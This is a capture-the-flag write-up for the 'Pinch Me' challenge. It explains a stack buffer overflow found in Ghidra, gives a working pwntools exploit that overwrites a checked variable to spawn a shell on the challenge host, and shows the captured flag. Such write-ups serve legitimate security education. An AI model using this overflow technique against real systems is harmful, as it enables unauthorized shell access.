## Pinch Me (100 Points)

### Problem  
```  
This should be easy!

nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480

File: pinch_me  
```

### Solution  
I opened the binary in Ghidra and looked at `main()` and `vuln()`.

It looks pretty similar to the [Pwn Sanity Check](PwnSanityCheck.md)
challenge, we need to overflow our input and ensure the shell gets executed.

Looking at `vuln()` we see that `fgets` reads in `100` bytes into `local_28`
which only has `24` bytes allocated - so the remaining bytes will overflow
into `local_10`.  
We see from the C code that there's a condition to be met before the shell
executes.

```C  
if (local_10 == 0x1337c0de) {  
 system("/bin/sh");  
}  
```

Can we just send 24 bytes of data and use `p64` to pack the address
`0x1337c0de` so then our condition will be met? Let's write some Python and
find out.

```python  
from pwn import *

host = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)  
host.recv()

buffer_overflow = b'a'*24  
buffer_overflow += p64(0x1337c0de)

host.sendline(buffer_overflow)  
host.interactive()  
```

Running our exploit...

```  
❯ python3 exploit.py  
[+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on
port 7480: Done  
[*] Switching to interactive mode  
$ ls  
flag.txt  
pinch_me  
startService.sh  
$ cat flag.txt  
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}  
```

Flag: `dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}`  

Original writeup
(https://github.com/cieran/writeups/blob/main/DragonCTF/pwn/PinchMe.md).